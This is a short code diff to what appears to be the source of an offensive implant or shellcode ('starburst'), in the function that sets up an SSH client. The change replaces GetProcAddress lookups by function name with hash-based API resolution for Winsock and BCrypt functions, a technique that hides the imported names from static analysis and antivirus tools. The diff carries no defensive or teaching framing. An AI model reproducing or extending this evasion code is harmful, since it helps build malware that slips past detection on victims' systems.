@@ -1587,8 +1587,7 @@ auto declfn starburst::ssh_client_init(instance& inst) -> bool {
     if (!state->h_ws2) { inst.heap_free(state); return false; }
 
     #define RESOLVE_WS(name) \
-        { char fn[] = #name; \
-          state->p##name = decltype(state->p##name)(inst.kernel32.GetProcAddress((HMODULE)state->h_ws2, fn)); \
+        { state->p##name = decltype(state->p##name)(resolve::_api(reinterpret_cast<uintptr_t>(state->h_ws2), expr::hash_string(#name))); \
           if (!state->p##name) { inst.heap_free(state); return false; } }
 
     RESOLVE_WS(WSAStartup)
@@ -1613,8 +1612,7 @@ auto declfn starburst::ssh_client_init(instance& inst) -> bool {
     if (!state->h_bcrypt) { inst.heap_free(state); return false; }
 
     #define RESOLVE_BC(name) \
-        { char fn[] = #name; \
-          state->p##name = decltype(state->p##name)(inst.kernel32.GetProcAddress(state->h_bcrypt, fn)); \
+        { state->p##name = decltype(state->p##name)(resolve::_api(reinterpret_cast<uintptr_t>(state->h_bcrypt), expr::hash_string(#name))); \
           if (!state->p##name) { inst.heap_free(state); return false; } }
 
     RESOLVE_BC(BCryptGenerateKeyPair)
